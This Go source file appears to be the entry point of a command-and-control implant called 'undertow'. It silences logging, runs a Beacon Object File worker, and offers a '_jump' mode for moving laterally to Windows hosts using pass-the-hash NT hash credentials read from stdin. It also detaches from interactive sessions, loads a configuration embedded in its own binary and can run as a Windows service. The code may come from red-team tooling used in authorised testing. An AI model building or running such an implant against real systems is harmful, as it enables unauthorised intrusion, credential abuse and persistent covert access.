package main

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"syscall"

	"undertow/internal/agent"
	"undertow/internal/agentprofile"
	"undertow/internal/bof"
	"undertow/internal/windowsdeploy"
)

func main() {
	log.SetOutput(io.Discard)
	if len(os.Args) == 2 && os.Args[1] == "_bof-worker" {
		if err := bof.WorkerMain(os.Stdin, os.Stdout); err != nil {
			os.Exit(1)
		}
		return
	}
	if len(os.Args) > 1 && os.Args[1] == "_jump" {
		var err error
		args := os.Args[2:]
		if len(args) == 6 && args[5] == "--credential-stdin" {
			var credential windowsdeploy.HashCredential
			decoder := json.NewDecoder(io.LimitReader(os.Stdin, 2048))
			if decodeErr := decoder.Decode(&credential); decodeErr != nil {
				err = errors.New("invalid Jump credential input")
			} else {
				err = windowsdeploy.RunNTHash(context.Background(), args[:5], credential, os.Stdout)
			}
		} else {
			err = windowsdeploy.Run(context.Background(), args, os.Stdout)
		}
		if err != nil {
			_, _ = fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		return
	}
	if handled, err := launchJumpAgent(); handled {
		if err != nil {
			os.Exit(1)
		}
		return
	}
	if len(os.Args) != 1 {
		os.Exit(2)
	}
	path, err := os.Executable()
	if err != nil {
		os.Exit(1)
	}
	if launched, err := detachIfInteractive(); err != nil {
		os.Exit(1)
	} else if launched {
		return
	}
	embedded, err := agentprofile.Read(path)
	if err != nil {
		os.Exit(1)
	}
	cfg := embedded.Config
	cfg.Metadata = embedded.Identity()
	cfg.Packaged = true
	if err := runConfiguredAgent(cfg); err != nil {
		os.Exit(1)
	}
}

func runConfiguredAgent(cfg agent.Config) error {
	if handled, err := runWindowsService(cfg); handled {
		return err
	}
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	return agent.Run(ctx, cfg, nil)
}
